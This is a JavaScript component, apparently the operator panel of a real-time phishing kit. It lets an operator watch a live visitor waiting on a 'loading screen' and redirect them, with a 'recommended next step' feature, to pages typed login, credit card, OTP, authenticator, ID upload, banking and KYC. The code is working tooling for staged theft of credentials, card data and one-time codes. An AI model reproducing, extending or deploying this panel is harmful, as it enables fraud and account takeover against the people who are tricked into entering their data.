/**
 * ALP - Session Redirect Modal
 * Handles custom redirect prompts, quick-redirect presets, and context-aware recommendations.
 */
const SessionRedirectModal = (() => {
  async function show(sessionId) {
    // Show modal immediately with loading state
    window.showModal({
      title: '↗ Redirect Session',
      content: `
        <div class="redirect-modal-content">
          <div id="redirect-context-banner" class="redirect-context-banner" style="display:none;"></div>
          <div class="redirect-pages-section">
            <div class="redirect-pages-label">Quick Redirect Pages</div>
            <div class="redirect-pages-grid" id="redirect-pages-grid">
              <div style="text-align:center;padding:18px;color:var(--text-muted);font-size:12px;">Loading pages…</div>
            </div>
          </div>
          <div class="redirect-divider"></div>
          <div class="redirect-custom-section">
            <div class="redirect-pages-label">Custom URL</div>
            <div style="display:flex;gap:8px;">
              <input type="url" id="modal-redirect-url" placeholder="https://example.com" class="redirect-custom-input" />
              <button id="modal-redirect-send" class="redirect-send-btn">Send</button>
            </div>
          </div>
        </div>
      `,
      hideButtons: true,
      onConfirm: () => {}
    });

    // Wire up the custom URL send button
    setTimeout(() => {
      const sendBtn = document.getElementById('modal-redirect-send');
      const urlInput = document.getElementById('modal-redirect-url');
      if (sendBtn && urlInput) {
        const doSend = async () => {
          const url = urlInput.value.trim();
          if (!url) { window.showToast('Enter a target URL', 'warning'); return; }
          // showModal replaces any open modal automatically — no need to close first
          const savedUrl = url;
          window.showModal({
            title: '⚠️ Confirm Redirect',
            content: `<p style="color:var(--text-secondary);font-size:14px;">Are you sure you want to redirect this session to:</p>
              <div style="background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.2);border-radius:10px;padding:12px 16px;margin-top:10px;font-family:monospace;font-size:13px;color:#a5b4fc;word-break:break-all;">${SessionTemplates.escapeHtml(savedUrl)}</div>`,
            onConfirm: async () => {
              try {
                await window.ALPApi.redirectSession(sessionId, savedUrl);
                window.showToast('✅ Redirect sent!', 'success');
              } catch (err) {
                window.showToast('Redirect failed', 'error');
              }
            }
          });
        };
        sendBtn.addEventListener('click', doSend);
        urlInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') doSend(); });
      }
    }, 50);

    // Fetch session details first (need website_id), then fetch pages for that website only
    let sessionData = null;
    let funnelData = null;
    let suggestedUrl = null;
    let previousPageLabel = null;

    try {
      // Step 1: get session to resolve website_id
      sessionData = await window.ALPApi.getSession(sessionId);
      const s = sessionData.session || sessionData;
      const pageViews = sessionData.page_views || sessionData.pageViews || [];

      // Step 2: fetch demo pages scoped to this session's website only
      const pagesRes = await window.ALPApi.getDemoPages(s.website_id || null);

      // --- Compute previous page (last page before /loading) ---
      const cleanPath = (url) => (url || '').split('?')[0].replace(/\/$/, '').toLowerCase();
      const isLoadingPage = SessionTemplates.isLoadingPage;

      // Walk backwards through page_views to find last non-loading page
      let prevView = null;
      for (let i = pageViews.length - 1; i >= 0; i--) {
        if (!isLoadingPage(pageViews[i].page_url)) {
          prevView = pageViews[i];
          break;
        }
      }
      if (prevView) {
        previousPageLabel = prevView.page_title || prevView.page_url;
      }

      // --- Fetch funnel to determine suggested next step ---
      if (s.website_id) {
        try {
          funnelData = await window.ALPApi.getFunnel(s.website_id);
        } catch { /* no funnel configured – that's fine */ }
      }

      if (funnelData && funnelData.funnel && funnelData.funnel.steps) {
        const steps = funnelData.funnel.steps;
        let metadata = {};
        try {
          const raw = s.metadata;
          if (raw && typeof raw === 'object') metadata = raw;
          else if (typeof raw === 'string' && raw.trim()) metadata = JSON.parse(raw);
        } catch {}

        let currentIdx = -1;
        if (metadata.hasOwnProperty('currentStepIndex')) {
          currentIdx = parseInt(metadata.currentStepIndex, 10);
        } else if (prevView) {
          const prevPath = cleanPath(prevView.page_url);
          currentIdx = steps.findIndex(step => cleanPath(step.url) === prevPath);
        }

        // Find the next non-loading step after currentIdx
        if (currentIdx >= 0) {
          let nextIdx = currentIdx + 1;
          while (nextIdx < steps.length) {
            if (isLoadingPage(steps[nextIdx].url)) { nextIdx++; }
            else break;
          }
          if (nextIdx < steps.length) {
            suggestedUrl = cleanPath(steps[nextIdx].url);
          }
        }
      }

      // --- Render context banner ---
      const banner = document.getElementById('redirect-context-banner');
      const currentPage = cleanPath(s.current_page || '');
      const isHolding = s.is_active && isLoadingPage(currentPage);

      if (banner && (previousPageLabel || isHolding)) {
        let bannerHtml = '';
        if (isHolding) {
          bannerHtml += `
            <div class="rctx-row rctx-holding">
              <span class="rctx-icon">⏳</span>
              <span class="rctx-text"><strong>Visitor is waiting</strong> on the loading screen</span>
            </div>`;
        }
        if (previousPageLabel) {
          bannerHtml += `
            <div class="rctx-row rctx-prev">
              <span class="rctx-icon">📍</span>
              <span class="rctx-text">Last page: <strong>${SessionTemplates.escapeHtml(previousPageLabel)}</strong></span>
            </div>`;
        }
        if (suggestedUrl) {
          bannerHtml += `
            <div class="rctx-row rctx-suggest">
              <span class="rctx-icon">✨</span>
              <span class="rctx-text">Suggested next step: <strong>${SessionTemplates.escapeHtml(suggestedUrl)}</strong></span>
            </div>`;
        }
        banner.innerHTML = bannerHtml;
        banner.style.display = 'flex';
      }

      // --- Populate page buttons grid ---
      const pages = pagesRes.pages || pagesRes || [];
      const grid = document.getElementById('redirect-pages-grid');
      if (!grid) return;

      if (pages.length === 0) {
        grid.innerHTML = `<div style="text-align:center;padding:14px;color:var(--text-muted);font-size:12px;">No pages configured</div>`;
        return;
      }

      const iconMap = {
        general: '📄',
        loading: '⏳',
        login: '🔐',
        credit_card: '💳',
        otp: '📱',
        email_verify: '📧',
        authenticator: '🔑',
        id_upload: '🪪',
        banking: '🏦',
        personal_info: '👤',
        kyc: '🪪'
      };

      grid.innerHTML = pages.map(p => {
        const icon = iconMap[p.form_type] || '📄';
        const pClean = cleanPath(p.url);
        const isSuggested = suggestedUrl && pClean === suggestedUrl;
        return `
          <button class="redirect-page-btn${isSuggested ? ' suggested' : ''}" data-url="${SessionTemplates.escapeHtml(p.url)}" title="${SessionTemplates.escapeHtml(p.url)}">
            ${isSuggested ? '<span class="rctx-badge">✨ Recommended</span>' : ''}
            <span class="redirect-page-icon">${icon}</span>
            <span class="redirect-page-name">${SessionTemplates.escapeHtml(p.name)}</span>
            <span class="redirect-page-url">${SessionTemplates.escapeHtml(p.url)}</span>
          </button>
        `;
      }).join('');

      // Wire up click handlers on page buttons
      grid.querySelectorAll('.redirect-page-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          const url = btn.dataset.url;
          const pageName = btn.querySelector('.redirect-page-name')?.textContent || url;
          // showModal replaces any open modal automatically — no need to close first
          window.showModal({
            title: '⚠️ Confirm Redirect',
            content: `<p style="color:var(--text-secondary);font-size:14px;">Are you sure you want to redirect this session to:</p>
              <div style="background:rgba(99,102,241,0.08);border:1px solid rgba(99,102,241,0.2);border-radius:10px;padding:12px 16px;margin-top:10px;">
                <div style="font-weight:600;color:var(--text-primary);font-size:14px;margin-bottom:4px;">${SessionTemplates.escapeHtml(pageName)}</div>
                <div style="font-family:monospace;font-size:12px;color:#a5b4fc;word-break:break-all;">${SessionTemplates.escapeHtml(url)}</div>
              </div>`,
            onConfirm: async () => {
              try {
                await window.ALPApi.redirectSession(sessionId, url);
                window.showToast(`✅ Redirected to ${url}`, 'success');
              } catch (err) {
                window.showToast('Redirect failed', 'error');
              }
            }
          });
        });
      });
    } catch (err) {
      const grid = document.getElementById('redirect-pages-grid');
      if (grid) grid.innerHTML = `<div style="text-align:center;padding:14px;color:#ef4444;font-size:12px;">Failed to load pages</div>`;
    }
  }

  return { show };
})();
